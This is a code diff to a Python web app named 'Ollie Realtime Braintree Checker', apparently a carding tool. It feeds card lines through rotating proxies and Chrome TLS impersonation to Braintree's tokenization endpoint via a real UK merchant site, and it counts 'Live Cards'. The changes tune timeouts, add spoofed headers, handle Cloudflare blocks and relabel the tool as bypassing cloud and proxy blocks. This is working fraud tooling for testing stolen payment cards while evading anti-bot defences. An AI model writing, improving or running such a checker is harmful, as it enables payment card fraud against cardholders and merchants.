@@ -19,7 +19,7 @@ from faker import Faker
 
 urllib3.disable_warnings()
 
-app = FastAPI(title="Ollie Realtime Braintree Checker - Final Optimized")
+app = FastAPI(title="Ollie Realtime Braintree Checker - Fully Optimized")
 
 HOST = "https://www.partyrama.co.uk"
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
@@ -190,7 +190,7 @@ def run_single_card(card_line, pool):
     
     for attempt in range(2):
         try:
-            sess = cffi.Session(impersonate="chrome124", timeout=30)
+            sess = cffi.Session(impersonate="chrome124", timeout=35)
             sess.trust_env = False
             prox = pool.next_dict()
 
@@ -228,17 +228,22 @@ def run_single_card(card_line, pool):
             }
             
             try:
-                bt = requests.post(BT_GRAPHQL, json=tp, proxies=prox, headers={
+                bt = sess.post(BT_GRAPHQL, json=tp, proxies=prox, headers={
                     "authorization": "Bearer " + fingerprint,
                     "braintree-version": BT_VERSION,
                     "content-type": "application/json",
                     "origin": "https://assets.braintreegateway.com",
+                    "referer": "https://assets.braintreegateway.com/",
                     "user-agent": UA,
-                }, timeout=12, verify=False)
+                }, timeout=15, verify=False)
             except Exception:
                 return {"card": masked, "status": "ERROR", "reason": "Gateway Connection Failed (Proxy/Cloud Block)"}
             
-            bj = bt.json()
+            try:
+                bj = bt.json()
+            except Exception:
+                return {"card": masked, "status": "DECLINED", "reason": "Gateway Blocked Response (Cloudflare)"}
+
             nonce_token = (bj.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
             if not nonce_token:
                 err = bj.get("errors") or "no token"
@@ -279,7 +284,7 @@ async def index():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Ollie Realtime Checker - Optimized</title>
+    <title>Ollie Realtime Checker - Fully Optimized</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-slate-950 text-white min-h-screen p-6 font-mono">
@@ -287,7 +292,7 @@ async def index():
         <div class="border-b border-slate-800 pb-4 flex justify-between items-center">
             <div>
                 <h1 class="text-2xl font-bold text-emerald-400">Partyrama Realtime Checker</h1>
-                <p class="text-xs text-slate-400">Optimized Braintree Checker with Realtime Streaming</p>
+                <p class="text-xs text-slate-400">Bypass Cloud/Proxy Block + Realtime Streaming</p>
             </div>
             <div class="text-xs text-slate-400">
                 Live Cards: <span id="liveCount" class="text-emerald-400 font-bold">0</span> | 
